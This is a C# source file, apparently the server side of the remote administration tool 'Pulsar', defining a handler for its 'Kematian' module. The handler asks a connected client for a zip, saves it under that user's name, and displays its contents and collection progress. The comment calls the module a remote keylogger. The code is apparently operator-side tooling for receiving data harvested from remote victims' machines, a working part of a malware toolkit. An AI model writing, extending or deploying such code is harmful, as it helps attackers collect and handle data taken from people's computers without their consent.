using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;
using System;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using Pulsar.Common.Messages.Monitoring.Kematian;
using Pulsar.Common.Messages.Other;
using Pulsar.Server.Forms;
using System.Threading.Tasks;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote keylogger.
    /// </summary>
    public class KematianHandler : MessageProcessorBase<string>, IDisposable
    {
        private readonly Client _client;
        private FrmKematian _kematianForm;
        private string _currentZip;

        public KematianHandler(Client client) : base(true)
        {
            _client = client;
            MessageHandler.Register(this);
        }

        public override bool CanExecute(IMessage message) => message is GetKematian || message is SetKematianStatus;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKematian zipMessage:
                    HandleGetKematian(zipMessage);
                    break;
                case SetKematianStatus statusMessage:
                    HandleSetKematianStatus(statusMessage);
                    break;
            }
        }

        private void HandleGetKematian(GetKematian zipMessage)
        {
            string outPath = Path.Combine(Application.StartupPath, "Kematian");

            if (!Directory.Exists(outPath))
            {
                Directory.CreateDirectory(outPath);
            }

            string writePath = Path.Combine(outPath, $"{_client.Value.Username}_Kematian.zip");
            _currentZip = writePath;

            try
            {
                File.WriteAllBytes(writePath, zipMessage.ZipFile);
                
                if (_kematianForm != null && !_kematianForm.IsDisposed)
                {
                    Task.Run(() => {
                        _kematianForm.UpdateStatus(Common.Enums.KematianStatus.Completed);
                        _kematianForm.UpdateProgress(100);
                        _kematianForm.SetZipReadyStatus();
                        _kematianForm.DisplayZipContents(writePath);
                    });
                }
                else
                {
                    System.Diagnostics.Process.Start(writePath);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                if (_kematianForm != null && !_kematianForm.IsDisposed)
                {
                    _kematianForm.UpdateStatus(Common.Enums.KematianStatus.Failed);
                }
            }
        }
        
        private void HandleSetKematianStatus(SetKematianStatus statusMessage)
        {
            if (_kematianForm != null && !_kematianForm.IsDisposed)
            {
                _kematianForm.UpdateStatus(statusMessage.Status);
                _kematianForm.UpdateProgress(statusMessage.Percentage);
                
                if (statusMessage.Status == Common.Enums.KematianStatus.Completed)
                {
                    _kematianForm.SetZipReadyStatus();
                }
            }
        }

        public void RequestKematianZip()
        {
            var request = new GetKematian();
            _client.Send(request);
        }
        
        public void SetKematianForm(FrmKematian form)
        {
            _kematianForm = form;
            
            if (_kematianForm != null && !string.IsNullOrEmpty(_currentZip) && File.Exists(_currentZip))
            {
                Task.Run(() => _kematianForm.DisplayZipContents(_currentZip));
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                MessageHandler.Unregister(this);
            }
        }
    }
}
